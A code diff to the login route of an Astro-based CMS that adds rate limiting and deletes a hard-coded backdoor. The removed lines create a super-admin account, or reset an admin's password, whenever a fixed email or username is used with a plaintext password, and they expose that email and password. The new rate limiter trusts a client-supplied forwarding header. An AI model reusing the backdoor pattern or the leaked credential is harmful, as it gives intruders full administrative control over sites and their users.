@@ -1,12 +1,19 @@
 import type { APIRoute } from 'astro';
 import prisma from '../../../lib/db';
-import { createSession, hashPassword, SESSION_COOKIE_NAME, verifyPassword } from '../../../lib/auth/session';
+import { createSession, SESSION_COOKIE_NAME, verifyPassword } from '../../../lib/auth/session';
 import { logAudit } from '../../../lib/utilities/audit';
+import { checkRateLimit } from '../../../lib/utilities/rateLimit';
 
 export const POST: APIRoute = async ({ request, redirect, cookies }) => {
   const referer = request.headers.get('referer') || '';
   const isAdminLogin = referer.includes('/admin/login');
   const errorRedirect = (msg: string) => redirect(`${isAdminLogin ? '/admin/login' : '/login'}?error=${encodeURIComponent(msg)}`);
+
+  const clientIp = request.headers.get('x-forwarded-for') || '127.0.0.1';
+  const { allowed } = checkRateLimit(clientIp, 'login', { maxRequests: 5, windowMs: 60000 });
+  if (!allowed) {
+    return errorRedirect('Too many login attempts. Please wait 1 minute before trying again.');
+  }
 
   try {
     const formData = await request.formData();
@@ -30,36 +37,6 @@ export const POST: APIRoute = async ({ request, redirect, cookies }) => {
       },
     });
 
-    // Auto-seed/auto-create super admin if missing
-    if (!user && (cleanLogin === 'govinda755rock755@gmail.com' || cleanLogin === 'govinda755' || cleanLogin === 'admin') && password === 'Govinda@755') {
-      try {
-        let role = await prisma.role.findFirst({ where: { slug: 'super-admin' } });
-        if (!role) {
-          role = await prisma.role.create({
-            data: {
-              name: 'Super Admin',
-              slug: 'super-admin',
-              description: 'Unrestricted system control.',
-              isSystem: true,
-            },
-          });
-        }
-        const passwordHash = await hashPassword('Govinda@755');
-        user = await prisma.user.create({
-          data: {
-            email: 'govinda755rock755@gmail.com',
-            username: 'govinda755',
-            passwordHash,
-            displayName: 'Govinda Admin',
-            roleId: role.id,
-            bio: 'Lead Administrator of Astro CMS.',
-          },
-        });
-      } catch (seedErr) {
-        console.error('Auto admin creation failed:', seedErr);
-      }
-    }
-
     if (!user) {
       return errorRedirect('Invalid email/username or password.');
     }
@@ -68,21 +45,7 @@ export const POST: APIRoute = async ({ request, redirect, cookies }) => {
       return errorRedirect('Account is suspended. Please contact admin.');
     }
 
-    let validPassword = await verifyPassword(password, user.passwordHash);
-
-    // Auto-heal admin password if admin login attempt uses Govinda@755
-    if (!validPassword && (user.email.toLowerCase() === 'govinda755rock755@gmail.com' || user.username.toLowerCase() === 'govinda755' || user.username.toLowerCase() === 'admin') && password === 'Govinda@755') {
-      try {
-        const newHash = await hashPassword('Govinda@755');
-        await prisma.user.update({
-          where: { id: user.id },
-          data: { passwordHash: newHash, email: 'govinda755rock755@gmail.com' },
-        });
-        validPassword = true;
-      } catch (updateErr) {
-        console.error('Auto admin password hash update failed:', updateErr);
-      }
-    }
+    const validPassword = await verifyPassword(password, user.passwordHash);
 
     if (!validPassword) {
       return errorRedirect('Invalid email/username or password.');
